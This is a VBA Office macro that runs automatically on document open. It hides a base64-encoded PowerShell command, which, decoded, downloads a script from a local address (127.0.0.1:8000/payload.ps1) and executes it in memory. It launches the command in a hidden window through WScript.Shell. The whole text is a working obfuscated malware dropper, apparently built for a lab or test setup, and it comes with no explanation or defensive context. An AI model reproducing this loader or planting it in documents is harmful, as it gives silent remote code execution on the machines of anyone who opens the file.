Sub AutoOpen()
    juice = "SQBFAFgAKABOAGUAdwAt" & _
    "AE8AYgBqAGUAYwB0ACAA" & _
    "UwB5AHMAdABlAG0ALgBO" & _
    "AGUAdAAuAFcAZQBiAEMA" & _
    "bABpAGUAbgB0ACkALgBE" & _
    "AG8AdwBuAGwAbwBhAGQA" & _
    "UwB0AHIAaQBuAGcAKAAn" & _
    "AGgAdAB0AHAAOgAvAC8A" & _
    "MQAyADcALgAwAC4AMAAu" & _
    "ADEAOgA4ADAAMAAwAC8A" & _
    "cABhAHkAbABvAGEAZAAu" & _
    "AHAAcwAxACcAKQA="
    wheel = "powershell.exe -E """ & juice & """"
    Set agent = CreateObject("WScript.Shell")
    
    agent.Run wheel, 0, False
    
End Sub
